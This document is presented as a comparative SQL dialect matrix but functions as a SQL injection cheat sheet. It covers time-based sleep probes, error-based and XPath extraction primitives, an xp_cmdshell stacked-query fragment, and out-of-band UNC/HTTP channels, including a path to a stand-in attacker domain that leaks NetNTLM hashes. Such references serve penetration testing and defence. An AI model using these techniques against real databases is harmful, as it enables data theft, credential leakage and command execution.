# Comparative DBMS SQL Architecture & Dialect Matrix

**Document Identifier:** SENTINEL-RES-DBMS-02  
**Classification:** Comparative Database Systems Research  
**Engines Analyzed:** PostgreSQL, MySQL, MariaDB, Microsoft SQL Server, Oracle Database, SQLite, CockroachDB, DuckDB  

---

## 1. Dialect Feature Matrix

| Feature / Primitive | PostgreSQL | MySQL / MariaDB | Microsoft SQL Server | Oracle Database | SQLite |
|:---|:---|:---|:---|:---|:---|
| **String Concatenation** | `'a' \|\| 'b'` | `'a' 'b'` or `CONCAT('a','b')` | `'a' + 'b'` | `'a' \|\| 'b'` | `'a' \|\| 'b'` |
| **Comment Syntax** | `--` (requires space), `/* */` | `-- ` (space required), `#`, `/* */` | `--`, `/* */` | `--`, `/* */` | `--`, `/* */` |
| **Inline Sleep Function** | `pg_sleep(seconds)` | `SLEEP(seconds)` | `WAITFOR DELAY '0:0:N'` | `DBMS_LOCK.SLEEP(N)` / `APEX_UTIL.PAUSE` | Heavy subquery / `randomblob(N)` |
| **Integer Conversion Cast** | `CAST(col AS integer)` / `col::int` | `CAST(col AS unsigned)` | `CAST(col AS int)` / `CONVERT(int, col)` | `TO_NUMBER(col)` / `CAST(col AS int)` | `CAST(col AS integer)` |
| **XPath / XML Error Injection** | `query_to_xml()` | `EXTRACTVALUE(1, CONCAT(0x7e, col))` | Substring/conversion | `CTXSYS.DRITHSX.SN(user, col)` | N/A |
| **Row Substring Extraction** | `SUBSTRING(col FROM pos FOR len)` | `SUBSTRING(col, pos, len)` / `MID()` | `SUBSTRING(col, pos, len)` | `SUBSTR(col, pos, len)` | `SUBSTR(col, pos, len)` |
| **ASCII Code Conversion** | `ASCII(char)` | `ASCII(char)` / `ORD(char)` | `ASCII(char)` | `ASCII(char)` | `UNICODE(char)` |
| **Primary System Catalog** | `information_schema.tables`, `pg_catalog.pg_tables` | `information_schema.tables` | `sys.tables`, `information_schema.tables` | `all_tables`, `user_tables`, `sys.dba_tables` | `sqlite_master`, `sqlite_schema` |
| **Stacked Queries Allowed?** | Yes (Engine level; depends on driver) | No by default in PHP/Node; Yes in multi-query | Yes (Native T-SQL support) | Yes (Inside `BEGIN ... END;` blocks) | Yes (Engine level; driver dependent) |
| **Out-of-Band (OAST) Channel** | `dblink`, `COPY FROM PROGRAM` | `LOAD_FILE('\\\\ip\\share')` (Windows) | `master..xp_dirtree '\\\\ip\\share'` | `UTL_HTTP.REQUEST`, `UTL_INADDR` | N/A (Embedded) |

---

## 2. Deep Engine Profiles

### 2.1 PostgreSQL (v9.6 – v17.x)
- **Error Behavior**: Highly verbose when explicit type coercion is applied. For example, `CAST((SELECT version()) AS integer)` throws:
  `ERROR: invalid input syntax for type integer: "PostgreSQL 16.2 on x86_64..."`
- **String Literals**: Standard strings use `'... '`. Dollar-quoted strings (`$$...$$` or `$tag$...$tag$`) allow escaping without single quotes.
- **Timing Execution**: `pg_sleep(seconds)` returns `void` and can be evaluated inline within `CASE` expressions:
  `SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END;`
- **Driver Stacked Query Caveat**: Python `psycopg2` and Node `pg` allow stacked queries in `query()` execution, whereas standard parameterized prepared statements reject multi-statement strings.

### 2.2 MySQL (v5.7 – v9.x) & MariaDB (v10.x – v11.x)
- **Error Behavior**: Historically supported `EXTRACTVALUE()` and `UpdateXML()` for XPath errors up to MySQL 8.0. In MySQL 8.0+, error length is capped, requiring offset/substring extraction.
- **Comment Nuances**: In MySQL, `--` is only a comment if followed immediately by whitespace or a control character (`-- ` or `--+` or `--%20`). `#` does not require a space.
- **Subquery Isolation**: In MySQL, modifying a table while reading from it in a subquery causes error `1093 (HY000): You can't specify target table for update in FROM clause`.

### 2.3 Microsoft SQL Server (2012 – 2024)
- **Error Behavior**: `CONVERT(int, (SELECT @@version))` immediately forces string output into the error log:
  `Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2022...' to data type int.`
- **Batch Execution**: T-SQL natively treats semicolons as optional query terminators, making stacked queries (`'; EXEC xp_cmdshell ...--`) universally valid at the parser level.
- **Out-of-Band SMB Probing**: Any access to a UNC path (`\\attacker.domain\share`) triggers an outbound SMB negotiation, leaking NetNTLM hashes or DNS lookups.

### 2.4 Oracle Database (11g – 23c)
- **Mandatory FROM Clause**: Every `SELECT` projection must include a `FROM` clause. Standalone scalar expressions must reference `FROM dual`:
  `SELECT 1 FROM dual;`
- **UNION Column Compatibility**: Oracle strictly enforces data type matching in `UNION SELECT`. A string column cannot be substituted with a numeric literal `NULL` without casting or using typed literals (`'NULL'`).
- **Null Comparison**: In Oracle SQL, an empty string `''` is treated as `NULL` (unlike ANSI SQL, PostgreSQL, or MySQL where `'' != NULL`).

### 2.5 SQLite (v3.x)
- **Architecture**: Embedded relational engine operating within application memory or local disk file.
- **Type Affinity**: SQLite uses dynamic type affinity; assigning a string to an INTEGER column does NOT trigger a type conversion error, making CAST error-based techniques ineffective.
- **Catalog Structure**: System schema is stored in `sqlite_master` (or `sqlite_schema` in SQLite 3.33.0+):
  `SELECT sql FROM sqlite_master WHERE type='table';`

---

## 3. Distributed, Cloud-Native & NewSQL Engines

1. **CockroachDB**: Wire-compatible with PostgreSQL. Implements `information_schema.tables` and `SHOW COLUMNS FROM <table>`. CAST error behavior mirrors PostgreSQL.
2. **DuckDB**: Fast in-process analytical engine. Supports `pg_tables` and PostgreSQL-compatible syntax with rich parquet/arrow extensions.
3. **Snowflake**: Cloud data warehouse. Supports `CURRENT_VERSION()`, `CURRENT_WAREHOUSE()`, and object metadata via `INFORMATION_SCHEMA`.
